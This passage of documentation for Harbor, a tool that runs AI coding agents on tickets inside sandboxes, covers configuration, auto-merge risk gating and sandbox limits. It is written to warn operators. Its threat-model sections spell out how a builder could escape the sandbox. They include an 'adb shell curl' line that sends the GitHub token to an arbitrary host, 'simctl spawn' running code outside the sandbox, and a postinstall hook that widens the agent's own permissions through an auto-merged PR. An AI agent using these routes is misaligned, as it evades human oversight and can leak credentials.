# The work-pipeline workflow

Harbor polls Linear and GitHub, persists what it sees in SQLite, and hands each
ticket to **one** workflow: the project's copy of the work-pipeline. Harbor
supervises custody, observation, retries, cancellation and recovery. The
work-pipeline's delivery skill owns planning, implementation, review, GitHub
writes and terminal Linear changes.

There are no workflow packages, presets or override layers. To change the dev
workflow, edit your project's copy.

## Layout

`harbor init` copies `workflows/work-pipeline/` into the repository:

```
<repo>/.harbor/
  pipeline.md                 # scope, cadence, worktree, install command
  workflow/                   # your editable work-pipeline (commit it)
    workflow.toml             # policy: merge mode, recovery, decisions, evidence, hooks, checks
    config.toml               # models: controller, planner, reviewer, implementor, first_mate
    skills/delivery/SKILL.md  # the ticket-to-PR instructions the builder follows
    skills/{planning,review,risk,blocker-assessment}/SKILL.md
    scripts/readiness.py      # pre_handoff / pre_merge readiness hook
    scripts/decision_policy.py
```

Harbor always loads `<repo>/.harbor/workflow/workflow.toml`. A missing copy
fails `harbor doctor` / `harbor start` with an exact message. There is no
fallback to the bundled copy at runtime.

## New user

```sh
harbor init Demo --repo /absolute/path/to/demo \
  --registry /absolute/path/to/projects.md \
  --linear-project YOUR_SLUG --linear-team YOUR_TEAM \
  --github-repository YOUR_OWNER/YOUR_REPO --model YOUR_MODEL \
  --required-check tests \
  --install-command 'uv sync' --test-command '["uv","run","pytest"]'
export HARBOR_PROJECTS_FILE=/absolute/path/to/projects.md
harbor workflow inspect Demo
harbor doctor Demo
```

Omit values in an interactive terminal to be prompted. `init` refuses to
overwrite an existing `.harbor/workflow`, `pipeline.md` or legacy
`workflow.toml`, writes `config.toml` with `--model` as the controller, starts
the project with `hold: true`, and removes only what it created if validation
fails. Commit `.harbor/workflow/`. Release `hold` before `harbor start Demo`.
Run one Harbor supervisor per project.

## Models (`config.toml`)

```toml
[controller]                  # the builder Harbor launches (required)
model = "gpt-6.1-terra"
reasoning_effort = "medium"
fallback_models = ["gpt-5.6-sol"]   # optional, ordered, explicit

[planner]
model = "gpt-6.2-sol"
[reviewer]
model = "gpt-6.2-sol"
[implementor]                 # empty: inherits the controller

[first_mate]                  # model defaults to the controller's
model = "gpt-6-luna"
max_recoveries = 3
allow_fresh_session = true
recheck_minutes = 10
stall_minutes = 30
```

Harbor reads `controller` (to launch the builder) and `first_mate`. The delivery
skill reads the child roles: the effective `roles` are also embedded in its
prompt. A role without a model inherits the controller's. A rejected child model
makes the skill retry with the controller model instead of blocking.

Fallbacks are opt-in and switch only after a structured provider error rejects
the model. Authentication, quota, timeout, cancellation and tool failures never
switch models.

### Provider fallback on usage limits (`[quota_fallback]`)

Model fallbacks never cross providers. To keep working when a provider reports a
usage limit, add a second provider profile. It is opt-in; without the section
Harbor waits for the reset exactly as before.

```toml
[quota_fallback]
max_switches = 2            # builder switches per run; default 2. 0 stops in-flight
                            # builder switches only: First Mate and new tickets
                            # still fall back. Remove the section to turn fallback off.

[quota_fallback.controller] # builder; planner/reviewer/implementor inherit it
provider = "codex"          # must differ from builder_provider in pipeline.md
model = "gpt-6.1-terra"
reasoning_effort = "medium" # required; must be valid for this provider

[quota_fallback.reviewer]   # optional per-role override (model / reasoning_effort)
model = "gpt-6.2-sol"

[quota_fallback.first_mate] # must differ from firstmate_provider in pipeline.md
provider = "codex"
model = "gpt-6-luna"
```

- **Two profiles, symmetric.** The primary profile is your roles plus the
  providers in `pipeline.md`; the fallback is this section. A run on either one
  that hits a usage limit moves to the other, unless that provider is also known
  to be out of usage.
- **Builder.** A run that ends on a usage limit, and is still waiting for its
  provider's reset, continues in a *fresh* session in the same worktree and
  branch. If the reset has already passed (for example Harbor was down across
  it), Harbor resumes the retained session in place instead, which keeps its
  memory. The old native session cannot move between
  providers, so the new session starts from a hand-off built from the ledger:
  ticket, PRs, open questions, operator answers not yet acted on, and the role
  models for the new provider. Conversation memory is not carried over. Each
  switch is recorded in `first_mate_recoveries` as `quota_fallback` (it does not
  spend First Mate's recovery budget), the operator is notified, and
  `/status --full` shows `switched <from> -> <to>`.
- **Stays until done.** A switched builder keeps its new provider until its run
  ends. At most `max_switches` switches happen per run, counted from the ledger
  so a restart does not reset it.
- **First Mate.** Its triage calls retry on the fallback profile after a quota
  error and use the primary again once the recorded reset passes.
- **New tickets** start on the fallback profile while the primary is known to be
  out of usage. Their launch prompt still lists the primary roles' models; a child
  agent whose model the provider rejects retries with the controller model, as the
  delivery skill already instructs.
- **Readiness.** A builder switch, and a new ticket starting on the fallback,
  happen only when that provider can run: the executable exists, and for Claude
  the CLI is logged in (`claude auth status`) and the project has no
  `playwright_browser_image`. Otherwise the builder keeps waiting and Harbor
  notifies once. First Mate's fallback call does not check readiness first; an
  unready fallback simply fails that call. `harbor doctor` prints each
  fallback's readiness.
- **Claude limits.** Claude Code builders allow only github.com, api.github.com,
  api.linear.app and registry.npmjs.org, and refuse `playwright_browser_image`.
- **Reload.** The fallback policy is read when Harbor starts; restart to apply
  edits. An invalid section stops startup instead of silently disabling it.

## Policy (`workflow.toml`)

| Section | Bundled default | Meaning |
| --- | --- | --- |
| `[delivery]` | `merge_mode = "human"` | `workflow_checked` allows merges for `auto_merge_risks` when `pre_merge` readiness passes |
| `[recovery]` | enabled, 30/120/300 s, 3 attempts | crash retries after an unexpected builder exit |
| `[decisions]` | `cite_only` | how First Mate answers blockers: `human`, `cite_only`, `bounded` |
| `[evidence]` | `ci = "required"`, `feedback = "advisory"` | what readiness gates on |
| `[cleanup]` | `after_merge` | worktree cleanup after an observed merge |
| `[hooks.*]` | readiness at `pre_handoff`/`pre_merge`, decision policy at `blocker` | script or skill hooks |
| `[checks.*]` | none | optional repository commands the skill runs with `harbor workflow checks` |
| `[github]` | `transport = "rest"` | how the builder reads and writes GitHub: `rest` (built-in helper) or opt-in `mcp` |
| `[builder]` | absent (off) | Claude builder sandbox opt-ins: `device_proof` platforms (paths out of the sandbox for emulator, simulator and local web proof), extra `allowed_domains`, and `allow_tmp` writes to the shared `/tmp`; protect `.harbor/` with Code Owner review on GitHub before enabling any |

Readiness gates only on facts Harbor can verify itself: fresh evidence, hold
state, PR identity, mergeability and CI (plus feedback when set to `required`).
Review, risk and proof are the skill's job. Harbor does not gate on its own
receipts for them, and a human still merges by default.

`pipeline.md` keeps `unblock_attempts` and `decision_authors`. Decision mode
and crash-retry delays come from `workflow.toml`.

### Merge risk (`auto_merge_risks`)

With `merge_mode = "workflow_checked"`, `pre_merge` readiness also requires
the ticket's effective risk to be listed in `auto_merge_risks`. Three sources
rate risk, and the effective risk is the **highest** of them:

- the **Linear floor**, set by a person: a `risk:low|medium|high` label, or a
  `Risk: <tier>` (or `Risk tier: <tier>`) line in the ticket description.
  It is optional.
- the **builder's tier** (`skills/risk`), which is required. It is a line that is
  exactly `Risk tier: low`, `Risk tier: medium` or `Risk tier: high` inside the PR
  body's `## Risk Analysis` section. That same section must also carry
  `<!-- harbor:risk-sha:<current head SHA> -->`.
- the **reviewer's rating** (`skills/review`), which is also required. The
  reviewer child rates the diff on its own. It does not copy the builder's tier.
  The rating is the `risk` field of the reviewer's JSON verdict comment.

```markdown
## Risk Analysis
Risk tier: low
Rationale: documentation-only change; reverting is one commit.
<!-- harbor:risk-sha:0123456789abcdef0123456789abcdef01234567 -->
```

```json
{"review":{"head_sha":"0123456789abcdef0123456789abcdef01234567","verdict":"approve","proof_verified":true,"feedback_digest":"…","risk":"low","risk_rationale":"docs only; one-commit revert"}}
```

Harbor counts a reviewer verdict only when all of these hold:

- it is a PR conversation comment whose whole body is that JSON object;
- its author is the GitHub login that opened the PR (the delivery identity);
- its `head_sha` is the PR's current head.

Comments from anyone else are ignored, so they can neither supply the rating
nor lower or veto it. If any counted verdict for the current head is a
`reject`, or has a `verdict` or `risk` that is not one of the exact lowercase
values, the risk is unknown. The same applies to a `review` object with no
`head_sha`. When several current-head approvals exist, the highest `risk` wins.

No source can lower another. Harbor keeps the highest tier it has seen for the
run, so a later push or edit cannot drop it. If the builder's tier is missing,
stale or unparseable, or there is no current-head reviewer approval, the
effective risk is unknown and the automatic merge fails closed. Harbor does not
interpret free text.

Limits to know:

- The builder and its reviewer child post with the same GitHub identity. The
  author check keeps out third parties, but it does not prove that a separate
  reviewer wrote the verdict.
- Harbor reads the first 100 PR comments.

So list only the tiers you are willing to merge on the agents' own assessment.
The defaults, `auto_merge_risks = []` and `merge_mode = "human"`, never
auto-merge.

### GitHub transport (`[github]`)

The builder needs GitHub to open, update, comment on, check and (when the
workflow allows) merge its PR. Harbor does not rely on the GitHub CLI for this:
inside Claude Code's macOS sandbox `gh` cannot complete a TLS handshake and
hangs, while plain HTTPS to the API works. The builder is told to prefer the
configured transport; where `gh` does work (for example Codex, or Linux) it may
still use it, and with no token in the environment it is told to try `gh` before
reporting a blocker. Harbor tells the builder which transport it
has in the launch prompt.

```toml
[github]
transport = "rest"   # default; or "mcp" (Claude builders only)
# mcp_url = "https://api.githubcopilot.com/mcp/"   # only with transport = "mcp"
```

**`rest` (default, no extra setup).** The builder runs Harbor's helper,
`python -m harbor.github_rest`, which calls the GitHub REST API through `curl`.
Operations: `pr-view`, `pr-create`, `pr-edit`, `pr-comment`, `pr-checks`,
`pr-merge` (pinned to a head SHA) and `api METHOD /path` for anything else. It
uses the token you already export for Harbor (`GITHUB_TOKEN` or `GH_TOKEN`),
targets the project's `github_repository`, and derives the REST base from
`github_api_url` (`https://host/api/graphql` becomes `https://host/api/v3` on
GitHub Enterprise Server). The token is passed to `curl` on stdin, so it is never
on a command line, on disk or in output. Requests only go to that API host.

Set `github_api_url` (or its aliases `github_graphql_url` and `github_endpoint`)
in the project registry, as a column of the project's row, or in
`.harbor/pipeline.md`. A non-empty registry value wins over the pipeline file,
as `linear_api_url` does; an empty registry column is ignored. With neither,
Harbor uses `https://api.github.com/graphql`. A registry value goes through the
same checks as a pipeline value, so a malformed one stops `harbor start` and
fails `harbor doctor` for a Claude builder.

Neither `github_api_url` nor `linear_api_url` may carry credentials. A URL with
userinfo, such as `https://user:secret@host/api/graphql`, is refused when the
project is loaded or by `harbor doctor`, for every builder, because HTTP
errors would repeat the full URL in logs. Look-alike `@` signs (`＠`, `﹫`)
count as `@`, and a host with any non-ASCII character is refused too (give an
internationalized name in its `xn--` form). Supply the GitHub token through
`GITHUB_TOKEN`, `GH_TOKEN` or the variable named by `github_token_env`, and
the Linear key through `LINEAR_API_KEY` or `HARBOR_LINEAR_API_KEY`.

`github_repository`, `required_checks` and `bot_rework_cap` use the same
precedence: registry, then `.harbor/pipeline.md`, then the default, with an
empty registry column ignored (a bare registry repository name keeps the
pipeline's `github_owner`; a registry `bot_rework_cap` that is not a
non-negative integer is an error). The repository the REST helper targets
(`HARBOR_GITHUB_REPOSITORY`) is the one Harbor's GitHub poller reads, in
`harbor start`, `harbor poll`, `harbor doctor` and `harbor workflow check`.

**`mcp` (opt-in, Claude builders only).** Harbor passes the Claude builder a
GitHub MCP server and pre-approves only its tools; the Bash sandbox and its
network allowlist are unchanged. The server runs outside the Bash sandbox. The
`Authorization` header holds `${GITHUB_TOKEN}` (or whichever variable is set),
which Claude Code expands, so the token is never written into the command.
The default endpoint is GitHub's hosted server, which serves GitHub.com only and
is a dependency on that service; set `mcp_url` to a self-hosted
`github-mcp-server` to avoid it. On GitHub Enterprise Server `mcp_url` is
required, so an Enterprise token is never sent to the GitHub.com server. Codex builders
are refused at startup, because a non-interactive Codex run refuses MCP calls
that need approval. The REST helper stays available as a fallback.

Token scopes: the builder pushes branches and edits PRs, so a fine-grained token
needs repository **Contents** and **Pull requests** read/write, plus **Checks**
and **Commit statuses** read. `harbor doctor` prints the transport and which
variable the token comes from, and fails when GitHub is configured with no token.
Verified on macOS with Claude Code 2.1.330 and GitHub.com; Linux, Codex and
GitHub Enterprise Server use the same code path but were not run.

**Claude builder child agents.** The delivery skill spawns planner,
implementor and reviewer children. A Claude builder does this with Claude
Code's `Agent` tool, which Harbor always enables; there is nothing to
configure. Children run inside the builder's own Claude Code process, so they
get exactly the builder's tools (`Bash`, `Read`, `Glob`, `Grep`, `Edit`,
`Write`, `Skill`, `Agent`), its permission rules and `dontAsk` mode, and the
same Bash sandbox: the same writable paths and the same network allowlist
below. They cannot use a tool, edit a file or reach a host the builder cannot.
Verified on macOS with Claude Code 2.1.332: a child created and edited files in
the worktree with `Write` and `Edit`, ran `cd sub && npm test`, and was refused
a `Write` outside the worktree.

**Claude builder sandbox network.** A Claude builder's Bash commands (the REST
helper, `git push`, `curl`) can reach only an allowlist of hosts:
`github.com`, `api.github.com`, `api.linear.app` and `registry.npmjs.org`, plus
the hosts your project configures. Harbor adds the host of `github_api_url`
(on GitHub Enterprise Server, `https://ghe.example.com/api/graphql` adds
`ghe.example.com`, which serves both the API and git), the git host of an
`api.<host>` endpoint (`api.acme.ghe.com` also adds `acme.ghe.com`), and the
host of `linear_api_url`. Only the host of an `https` URL is used; a path, port,
wildcard, user name, IP address (including numeric forms such as
`0x7f.0x0.0x0.0x1`, or any host whose last label is a decimal or `0x` number) or
whitespace is never added. A malformed GitHub value stops `harbor start` and
fails `harbor doctor` instead of widening the sandbox. A `linear_api_url` the
allowlist cannot express (for example a local `http://127.0.0.1:8080/graphql`
stub) is left out with a warning from `harbor start` and a
`Linear sandbox access: not added (...)` line in `harbor doctor`; Harbor itself
still reaches it, but builder Bash commands cannot. A GitHub.com project gets exactly the default list. `harbor doctor`
prints the list as `Builder sandbox network:` for Claude builders; it shows
what the sandbox allows, not that the host answers. A git remote on a host
other than the API host (for example SSH through a separate hostname) is not
added. A Claude builder therefore cannot use a GitHub Enterprise Server that is
addressed by an IP address or a single-label name such as `https://github/`;
Harbor refuses it instead of guessing, so give the server a DNS name. Codex
builders are unaffected, since their sandbox does not filter by host, and these
rules are applied only to Claude builders, including a retained Claude session
on a project since switched to Codex. `harbor start` and `harbor doctor` do not
check such a session, so when it is resumed Harbor prints the same Linear
warning, and if the GitHub value stops it, a `Harbor: warning: the retained
Claude builder session for <ticket> cannot resume: ...` line (once per process);
the session stays unresumed until `github_api_url` is fixed and Harbor is
restarted. Harbor reads the GitHub URL (`github_api_url`, or its aliases
`github_graphql_url` and `github_endpoint`) and the Linear URL
(`linear_api_url`, or `api_url`) for the sandbox once, when `harbor start`
builds its dispatcher (only the workflow package is reloaded per poll). If you
change either one, restart Harbor: a running `harbor start` keeps the old value
and, having warned once, prints nothing more. The warnings from `harbor start`
and from a resumed session say so; `harbor doctor`, which reads the current
value each run, does not. A deliberate local Linear stub needs no change. A configured DNS name is trusted as-is:
whoever can set `github_api_url` (the registry, `.harbor/pipeline.md` or
`AGENTS.md` in the main checkout) already decides where the GitHub token is
sent, so allowing that host gives them nothing new. Verified with unit tests and the production runner factory on macOS
(generated `--settings` for GitHub.com and a GitHub Enterprise Server config);
not run against a real GitHub Enterprise Server, a custom Linear endpoint, or
on Linux.

**Linked PRs.** Harbor finds a ticket's PRs from its Linear GitHub attachments,
and counts a link only when it is a PR of the project's `github_repository` on
the web host of `github_api_url`: `github.com` for the default endpoint,
`<sub>.ghe.com` for `https://api.<sub>.ghe.com/graphql`, and `<host>` (with any
port) for GitHub Enterprise Server's `https://<host>/api/graphql`. A link to any
other host is ignored, so Harbor never queries or acts on it. Nothing new to
configure.

A builder can open, attach and merge its PR and move the ticket to `Done` in
one turn. The ticket then leaves the Linear poll before Harbor has seen the
attachment. For a completed `outcome=merged` run that Harbor has not yet
verified, normal supervision re-reads that ticket's attachments from Linear, so
it can still verify the merge on GitHub and remove the worktree. This read
happens at most 3 times per run in each supervisor process, at least 60 seconds
apart. The builder's `pr_url` counts only if Linear lists it as an attachment.

### Claude builder file tools, extra hosts and `/tmp` (`[builder]`)

**File tools.** A Claude builder has Claude Code's `Edit` and `Write` tools,
approved for the ticket worktree only (`Edit(//<worktree>/**)`, which covers
both). There is nothing to configure. These tools run inside Claude Code, not
in the OS sandbox, so that rule is their whole boundary: `dontAsk` refuses an
edit or write anywhere else: no rule allows the main checkout, the ledger
directory or the repository's `.git` directory, and a `Write` through a symlink
in the worktree that points outside it was refused live. The worktree was already writable to sandboxed Bash, so
the rule makes nothing writable that was not before. Without these tools a
builder and its children had to edit through Bash, and `dontAsk` refused some
of those commands. On HAN-94 a child implementor's
`mkdir -p tests && printf ... > tests/test_greet.py` was refused with
"Permission to use Bash has been denied because Claude Code is running in don't
ask mode", and it made no change.

**Extra hosts (`allowed_domains`).** Builds that fetch from a host outside the
[allowlist](#github-transport-github), such as `next build` downloading Google
Fonts, fail with `deny network-outbound fonts.googleapis.com:443`. Opt in per
project:

```toml
[builder]
allowed_domains = ["fonts.googleapis.com", "fonts.gstatic.com"]   # absent or [] means none
```

Each entry is one exact, lower-case host name. A scheme, port, path, wildcard
(`*.googleapis.com`), IP address, single-label name (`localhost`) or a
duplicate fails `harbor doctor` and stops `harbor start` instead of being
widened or dropped. Subdomains are not included: list each host. **What it
widens:** every Bash command in the builder and its children can send data to
those hosts and download from them. Code the builder runs (tests, build
scripts, dependencies) can do so too, so a host that serves user content or
accepts uploads is a way to exfiltrate the worktree, the GitHub token's reach
aside. `harbor doctor` prints the merged list as `Builder sandbox network:` and
names the extra hosts on the next line.

**Shared `/tmp` (`allow_tmp`).** Claude Code points `TMPDIR` at its own
writable directory (`/tmp/claude-<uid>` on macOS), so code that asks for a temp
directory (`tempfile`, `os.tmpdir()`, `mktemp`) already works. A test that
hardcodes `/tmp` does not: `sqlite3.connect('/tmp/x.db')` fails with `unable to
open database file`. If you can, make the test use the temp directory. If not,
opt in:

```toml
[builder]
allow_tmp = true   # absent or false means off
```

This adds `/tmp` (and `/private/tmp`, its real path on macOS) to the Bash
sandbox's writable paths. **What it widens:** `/tmp` is shared by every
process and user on the host. A builder can then read and overwrite files
other programs keep there, leave files that persist after the run and that
later builders or other tools may trust, and replace a file another program is
about to open. Harbor's ledger and the operator checkout stay read-only.
Network and Unix-socket rules are unchanged, so writing a socket file in `/tmp`
does not let the builder connect to it. A per-run `TMPDIR` would not have fixed
the hardcoded-`/tmp` case, which is why this is a separate opt-in. `harbor
doctor` prints `Builder sandbox writes: [builder] allow_tmp adds ...` when it
is on.

Both settings apply to Claude builders only and are read per launch, like the
rest of the workflow. Codex builders are not changed: their sandbox does not
filter hosts, and Codex's `workspace-write` sandbox already lets it write
`/tmp` by default. A PR that changes `.harbor/` needs a
human merge (see below), since it could grant these. Everything else stays as
it was: `failIfUnavailable`, no unsandboxed commands, no excluded commands, and
the `device_proof` rules.

Verified on macOS with Claude Code 2.1.332 by running Harbor's exact builder
argv (`sonnet`, low effort) against a throwaway repository and linked
worktree. With neither opt-in, `fonts.googleapis.com`, `fonts.gstatic.com` and
`example.com` were denied by the sandbox, and the `/tmp` database failed. With
both, the fonts hosts answered (HTTP 400/404/200), the `/tmp` database was
created, and `example.com` was still denied. In every run, `Write` outside the
worktree, Bash `echo x > <outside>` and `Write` through a symlink in the
worktree were refused. Not run on Linux.

One limit of Claude Code itself remains: in `dontAsk` mode, a Bash command
with a `?` in a URL argument (`curl 'https://example.com/?a=1'`) is refused as
a permission, whatever the host. The same request made from a script, such as
Python's `urllib`, is only checked by the network allowlist.

### Device and browser proof (`[builder]`)

A project's own rules often require screenshots from an Android emulator, an
iOS Simulator or a local web server. A Claude builder's Bash sandbox blocks all
three by default:

| Tool | Failure inside the default sandbox |
| --- | --- |
| `adb start-server`, `adb devices` | `could not install *smartsocket* listener: Operation not permitted` (the adb server cannot bind 127.0.0.1:5037) |
| `xcrun simctl list`, `simctl io booted screenshot` | `CoreSimulatorService connection became invalid` (the XPC lookup is denied) |
| `python3 -m http.server`, Metro, Expo, `next dev` | `PermissionError: [Errno 1] Operation not permitted` on `bind` |

To allow them, list the platforms in your workflow copy:

```toml
[builder]
device_proof = ["android", "ios", "web"]   # any subset; absent or [] means off
```

Each platform adds one Claude Code sandbox rule:

| Platform | Adds | What it is for |
| --- | --- | --- |
| `android` | `network.allowLocalBinding = true` | the `adb` client reaches the adb server on `127.0.0.1:5037` (and can start it) |
| `web` | `network.allowLocalBinding = true` | dev servers (`http.server`, Metro, Expo, Next) bind a local port, and clients such as `curl` fetch it |
| `ios` | `network.allowMachLookup = ["com.apple.CoreSimulator.CoreSimulatorService", "com.apple.CoreSimulator.SimLaunchHost-arm64"]` (`-x86` on an Intel Mac) | `xcrun simctl list`, `install`, `launch` and `io booted screenshot` on a booted simulator |

The iOS names were found live, not guessed. A sandboxed Claude builder had
every other CoreSimulator service denied. With `CoreSimulatorService` alone,
the booted simulator showed `liblaunch_sim.dylib could not be opened`, and
`simctl install booted` said `No devices are booted`. Adding the host's
`SimLaunchHost` made install, launch and screenshot work. `simdiskimaged`,
`SimulatorTrampoline`, `SimRenderingServices.*` and
`SimAudioProcessorServices.*` were not needed, so they are not granted. Only
the arm64 name was verified, on an Apple silicon Mac.

**Harbor boots the devices, not the builder.** The sandbox cannot be
narrowed enough to boot devices:
- An emulator registers Mach services (`bootstrap_check_in`).
- Booting a simulator needs more CoreSimulator access than the rules above.

So before each launch of a builder with `android` or `ios`, Harbor, running
outside the sandbox, makes sure one device per platform is up:
- **Android:** an attached device is used as is. Otherwise Harbor starts the
  adb server and boots the first AVD by name with
  `emulator -avd <name> -no-snapshot-save`, then waits up to 4 minutes for
  `sys.boot_completed`. The emulator keeps running afterwards.
- **iOS:** a booted simulator is used as is. Otherwise Harbor runs
  `xcrun simctl boot` and `bootstatus -b` on the first available iPhone of
  the newest iOS runtime.

Harbor prints the result to its log and appends it to the builder's prompt.
When a boot fails, the prompt quotes the literal error and tells the builder
to report it as a blocker instead of working around the sandbox. To use a
particular device, boot it yourself before Harbor launches the builder.

**Web screenshots with Playwright.** With `web`, a builder can serve the app on
127.0.0.1 and screenshot it with Playwright inside its sandbox. No extra rule
is needed, but Chromium must run with `--single-process`:

```js
const browser = await chromium.launch({ args: ["--single-process"] });
const page = await browser.newPage({ viewport: { width: 1440, height: 900 } });
await page.goto("http://127.0.0.1:3000/");
await page.screenshot({ path: "desktop.png" });
await page.setViewportSize({ width: 390, height: 844 });
await page.screenshot({ path: "mobile.png" });
```

A normal launch dies with
`bootstrap_check_in org.chromium.Chromium.MachPortRendezvousServer.<pid>: Permission denied (1100)`.
Chromium registers a Mach service for its child processes, and the sandbox
allows looking services up but not registering them. In single-process mode,
use one page and resize it: a second browser context crashed the browser.
Harbor puts these instructions in the builder's prompt when `web` is enabled.

**What you are trusting the builder with.** Every platform gives the builder's
commands a path out of the sandbox. The sandbox flags stay set
(`failIfUnavailable`, `allowUnsandboxedCommands = false`), and the host
allowlist and writable paths do not change. Even so, a builder with these
rules can reach hosts and files the sandbox would otherwise block:

- **`android`.** adb talks to a device that runs outside the sandbox.
  `adb shell curl https://any-host/?t=$GITHUB_TOKEN` reaches any host, with
  anything the builder can read in the request. `adb push` and `adb pull` move
  worktree files on and off the device.
- **`ios`.** CoreSimulatorService runs outside the sandbox and acts for the
  builder. `xcrun simctl openurl booted https://any-host/...` reaches any host.
  A probe with only `CoreSimulatorService` allowed ran `simctl openurl`
  successfully. `xcrun simctl spawn` of a binary the
  builder compiled for the simulator runs code outside the sandbox, with
  access to the host filesystem. Treat `ios` as a sandbox escape. It can also
  install, erase or delete any simulator of the user running Harbor.
- **`web` (and `android`, which uses the same rule).** `allowLocalBinding`
  lets every Bash command connect to any local port, not only the dev server.
  That includes:
  - the adb server;
  - Chrome remote-debugging ports;
  - a Docker TCP socket, which is host root;
  - databases and other local APIs.

  It also lets the builder listen on `0.0.0.0`, so a server it starts can be
  reachable from your network.

**Who should enable it.** Enable a platform only when both are true:
- the machine running Harbor holds nothing the builder must not reach, such
  as other projects' credentials, a Docker daemon or browsers with debugging
  ports open;
- you would accept the builder acting as your user: with its network access
  and, with `ios`, with its file access.

A dedicated machine or user account for Harbor is the safe setup. Do not
enable it on a shared workstation, on a machine with production credentials,
or for repositories whose tickets come from people you do not trust to steer
the builder.

**No repository control bounds a device-proof builder.** Treat enabling
`ios` or `android` as letting the builder act as the user who runs Harbor:
- **`ios`.** `simctl spawn` runs builder-compiled code outside the sandbox with
  that user's file access. It can rewrite any file the user can, including
  the main checkout's `.harbor/workflow/workflow.toml`, which widens the grant
  for every later launch. GitHub branch protection never sees that change.
- **`android`.** adb gives a path out of the sandbox to the network and to
  files moved on and off the device.

So no Harbor check and no GitHub setting bounds a builder with these
platforms. Only enable them where that is acceptable (see "Who should enable
it").

**Changes that come through a PR.** A builder could also open a PR that grants
itself `device_proof`, or widens which builders get it through
`[quota_fallback]`. Harbor's own checks (below) are best effort: the builder
holds a GitHub token and can write its worktree's git directory, so it can get
around any check that runs on the builder's machine. What GitHub can enforce
depends on whether the project tracks `.harbor/`:
- **`.harbor/` untracked** (Harbor reads it from the main checkout). CODEOWNERS
  and branch protection on `/.harbor/` do not apply, because no PR touches
  `.harbor/`. The main checkout, `.harbor/` included, can be written by any
  code Harbor runs outside the sandbox:
  - the project's `install_command`, which runs unsandboxed in every new
    worktree. A low-risk PR that only adds a `postinstall` to `package.json`
    can edit `<repo_path>/.harbor/workflow/workflow.toml`, auto-merge, and
    widen the grant on the next worktree;
  - git hooks (#59);
  - the `ios` and `android` escapes above.
- **`.harbor/` tracked.** GitHub branch protection with required Code Owner
  review on `/.harbor/` makes a PR that touches `.harbor/` need a human
  approval. A change that lands in `.harbor/` through rename detection, from a
  PR whose diff touches only other paths, may not trigger Code Owner review.
  This has not been verified on GitHub. This is the recommended setup for a project that enables
  `device_proof`. It still does not stop the unsandboxed writes listed above,
  and it does not bound the device escapes.

To set it up for a tracked `.harbor/`:

1. Add `.github/CODEOWNERS` on the base branch with a line that gives `.harbor/`
   to a person or team, never to the account whose token the builder uses:

   ```text
   /.harbor/ @your-org/harbor-admins
   ```

2. In the repository's Settings → Branches (or Rules → Rulesets), add a rule for
   the base branch that:
   - requires a pull request before merging, with at least 1 approval;
   - requires review from Code Owners;
   - dismisses stale approvals when new commits are pushed;
   - blocks force pushes and deletion.
3. Do not add the builder's account or token to the bypass list. The rule must
   also apply to administrators if that account is an admin; turn on "Do not
   allow bypassing the above settings", or leave the account out of a
   ruleset's bypass list.
4. Check it: open a test PR that edits `.harbor/` and confirm GitHub shows
   "Review required" from the code owner.

**What Harbor checks on its own commands (best effort).** These checks stop
the builder merging a `.harbor/` change by accident through Harbor's own
commands. They do not stop a builder that means to get around them.
- **What counts:** any change to a path under `.harbor/`, compared after
  Unicode NFC normalisation and case folding, so `.HARBOR/` and
  `.harbor/workflow/WORKFLOW.toml`, which land on the real files on macOS, count
  too. Two comparisons, and either one counts:
  - `.harbor/` on the PR's base against what merging the PR would land there,
    from `git merge-tree --write-tree`. That is the same ort merge GitHub runs,
    over every merge base. On a git without `--write-tree`, the PR head is
    compared with every merge base.
  - every commit in the PR (`base..head`), as a conservative extra. For a
    merge commit, only the content it introduces itself counts.

  A merge conflict counts as unreadable. Neither comparison models a rebase
  merge: rebase replays commits with rename detection, which can land an edit
  to another path in `.harbor/`. So `pr-merge --method rebase` is refused with
  "human merge required: rebase merges can't be checked for .harbor/ changes"
  whenever anything under `.harbor/` is tracked at the base, the head or the
  merge result. Projects that keep `.harbor/` untracked may still rebase.
  `pr-merge` defaults to `--method squash`, which lands the merge result the
  check reads.
- **An untracked `.harbor/`.** Harbor reads the workflow from the main
  checkout, so a project may keep `.harbor/` untracked. When neither the merge
  base nor the PR head tracks anything under `.harbor/`, the PR cannot change
  it and the check passes. A PR that starts tracking `.harbor/` content counts
  as a change.
- **SHAs:** both come from GitHub as full SHAs, never from a local
  `origin/<base>` ref, which a builder can forge with `git tag` or
  `git update-ref`.
- **The repository's git config is not read.**
  - The check runs in a throwaway bare repository that borrows only the object
    directory of the main repository's git dir. When Harbor runs `pre_merge`
    itself, it resolves that git dir from the project's `repo_path`, not from
    the worktree's `.git` file.
  - The throwaway repository runs no hooks and no fsmonitor, and does not use
    ssh or `ext::` transports, upload-pack hooks, replacement objects, grafts,
    commit-graphs or a shallow file.
  - A commit missing locally is fetched only from Harbor's own URL for the
    configured repository, with `--upload-pack=git-upload-pack`, into the
    throwaway repository. The URL's host comes from the configured API URL:
    - `api.github.com` becomes `github.com`;
    - `api.<name>.ghe.com` becomes `<name>.ghe.com`;
    - any other host is GitHub Enterprise Server, which serves git on its API
      host, and is used unchanged (for example `https://api.corp.example/api/graphql`
      fetches from `api.corp.example`, never `corp.example`).
  - The fetch authenticates with Harbor's GitHub token: the same
    `GITHUB_TOKEN`, `GH_TOKEN` or `github_token_env` variable the REST helper
    uses. Harbor passes it to git through environment config, as an
    `http.https://<host>/.extraheader` scoped to that host. It never appears
    on the command line, and errors are redacted.
  - With no token, a missing commit fails closed with "no GitHub token is
    configured".
  - **Run inside the builder** (`pr-merge`, or `harbor workflow check` started
    by the builder), the check uses the builder's own environment and
    executables. Its result is only as trustworthy as the builder.
- **Unreadable is refused too.** These count as unreadable:
  - missing commits, or a SHA that does not match the PR head;
  - any tracked entry whose path case-folds to `.harbor` or anything below it
    that is not a plain directory (040000) or a regular file (100644 or
    100755), at the base, the head or the merge result. That covers symlinks
    and submodules at any depth and in any letter case, such as
    `.HARBOR -> cfg`, `.harbor/WORKFLOW -> ../cfg` or
    `.harbor/workflow/config.toml -> ../../cfg.toml`. On macOS, Harbor's
    runtime would follow those links to files outside `.harbor/`.
- **Where it runs:**
  - `pre_merge` in the bundled readiness hook and in `harbor workflow check`;
  - the builder's merge command, `python -m harbor.github_rest pr-merge N --sha SHA`.
- **The helper's `api` command is an allowlist.**
  - Reads (`GET`, `HEAD`) go through when they carry no request body, except
    on `/graphql`: GraphQL is POST only, so its mutation allowlist always
    applies.
  - Writes are allowed only for PR create, PR edit, issue and review comments,
    replies, reviews and labels, under `/repos/<owner>/<repo>/` for the
